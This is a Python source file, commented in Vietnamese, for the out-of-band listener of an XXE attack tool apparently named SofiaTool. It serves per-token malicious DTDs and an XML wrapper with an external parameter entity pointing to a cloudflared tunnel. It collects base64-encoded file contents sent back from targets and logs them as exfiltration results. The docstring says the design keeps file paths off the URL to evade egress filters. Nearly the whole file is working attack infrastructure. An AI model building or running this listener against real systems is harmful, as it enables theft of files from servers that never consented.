"""SofiaTool v2 — OOB listener (:8000, phía sau cloudflared tunnel).

Các route:
  GET /<token>.dtd         → trả DTD động. File path nằm trong TOKEN_PATHS map
                             phía listener, KHÔNG xuất hiện trên URL → né egress
                             filter chỉ chặn theo pattern path.
  GET /<token>.xml         → trả XML wrapper (cho variant dataIsURL).
  GET /<any>?t=<token>&data=<b64> → nhận exfil, decode, lưu RESULTS[token].
  GET /healthz             → health check qua CF edge.

filter_token() chặn mọi token không thuộc phiên hiện tại (chống noise từ
scanner khác / bản replay cũ).
"""
import re
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from core import config
from core.logger import get_logger

log = get_logger()

TOKEN_RE = re.compile(r"^/([A-Za-z0-9]{12})\.(dtd|xml)$")


class OOBListener:
    """Quản lý token, DTD cache, hits và exfil results (thread-safe)."""

    def __init__(self, host=None, port=None):
        self.host = host or config.LISTENER_HOST
        self.port = port or config.LISTENER_PORT
        self.lock = threading.Lock()
        self.tokens = {}          # token -> {"path": str, "dtd": bytes|None, "xml_url": str|None}
        self.dtd_hits = set()     # token đã được target fetch DTD
        self.results = {}         # token -> {"data": base64(str), "path": str, "ts": iso}
        self.tunnel_base = None   # https://xxxx.trycloudflare.com (set sau khi tunnel up)
        self.server = None
        self.thread = None

    # ------------------------------------------------------------ registration
    def register(self, token, path, dtd=None):
        """Đăng ký token cho path — path chỉ tồn tại trong map này."""
        with self.lock:
            self.tokens[token] = {"path": path, "dtd": dtd, "xml_url": None}
        log.debug("listener: registered token %s -> %s", token, path)

    def set_dtd(self, token, dtd_bytes):
        with self.lock:
            if token in self.tokens:
                self.tokens[token]["dtd"] = dtd_bytes

    def set_tunnel_base(self, url):
        self.tunnel_base = url.rstrip("/")

    def _xml_url(self, token):
        if not self.tunnel_base:
            return None
        return f"{self.tunnel_base}/{token}.xml"

    # -------------------------------------------------------------- read back
    def dtd_fetched(self, token):
        with self.lock:
            return token in self.dtd_hits

    def wait_result(self, token, timeout):
        """Poll cho tới khi có kết quả exfil hoặc hết timeout. Trả dict hoặc None."""
        import time
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self.lock:
                if token in self.results:
                    return dict(self.results[token])
            time.sleep(0.25)
        return None

    def get_result(self, token):
        with self.lock:
            r = self.results.get(token)
            return dict(r) if r else None

    # --------------------------------------------------------------- filtering
    def filter_token(self, token):
        """True nếu token hợp lệ cho phiên hiện tại."""
        with self.lock:
            return token in self.tokens

    # ------------------------------------------------------------------ serve
    def _handle(self, handler):
        parsed = urllib.parse.urlparse(handler.path)
        # libxml giữ literal '&amp;' trong system literal khi fetch -> normalize.
        # Dùng regex thủ công thay parse_qs: giữ nguyên '+' trong base64 data.
        raw_qs = parsed.query.replace("&amp;", "&")
        m_t = re.search(r"(?:^|&)t=([^&]*)", raw_qs)
        m_d = re.search(r"(?:^|&)data=([^&]*)", raw_qs)
        # 1) exfil callback:  ?t=<token>&data=<base64>
        if m_t and m_d:
            token = urllib.parse.unquote(m_t.group(1))
            if not self.filter_token(token):
                handler._reply(403, b"token rejected")
                return
            raw = urllib.parse.unquote(m_d.group(1))
            with self.lock:
                self.results[token] = {"data": raw, "path": self.tokens[token]["path"]}
            log.info("listener: EXFIL token=%s len=%d path=%s",
                     token, len(raw), self.tokens[token]["path"])
            handler._reply(200, b"ok")
            return
        # 2) DTD / XML theo token
        m = TOKEN_RE.match(parsed.path)
        if m:
            token, kind = m.group(1), m.group(2)
            if not self.filter_token(token):
                handler._reply(403, b"token rejected")
                return
            with self.lock:
                meta = self.tokens[token]
                dtd = meta["dtd"]
            if kind == "dtd":
                if dtd is None:
                    handler._reply(404, b"no dtd")
                    return
                with self.lock:
                    self.dtd_hits.add(token)
                log.info("listener: DTD fetched token=%s", token)
                handler._reply(200, dtd, content_type="application/xml")
                return
            # kind == xml -> wrapper doc cho dataIsURL
            url = self._xml_url(token)
            if not url:
                handler._reply(503, b"tunnel not ready")
                return
            dtd_url = f"{self.tunnel_base}/{token}.dtd"
            doc = (
                '<?xml version="1.0"?>\n'
                '<!DOCTYPE r [\n'
                '  <!ELEMENT r ANY>\n'
                f'  <!ENTITY % sp SYSTEM "{dtd_url}">\n'
                '  %sp;\n'
                ']>\n'
                '<r>x</r>\n'
            ).encode("utf-8")
            handler._reply(200, doc, content_type="application/xml")
            return
        # 3) health
        if parsed.path in ("/healthz", "/"):
            handler._reply(200, b"sofia-listener-ok", content_type="text/plain")
            return
        handler._reply(404, b"not found")

    # ---------------------------------------------------------------- lifecycle
    def start(self):
        self.server = ThreadingHTTPServer((self.host, self.port), _make_handler(self))
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        log.info("listener up on %s:%d", self.host, self.port)
        return self

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            log.info("listener stopped")


def _make_handler(listener):
    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def _reply(self, code, body, content_type="text/plain"):
            try:
                self.send_response(code)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            except (BrokenPipeError, ConnectionResetError):
                pass

        def log_message(self, fmt, *args):
            pass  # giữ log riêng, tránh spam

        def do_GET(self):
            listener._handle(self)

        def do_HEAD(self):
            self._reply(200, b"")

    return Handler



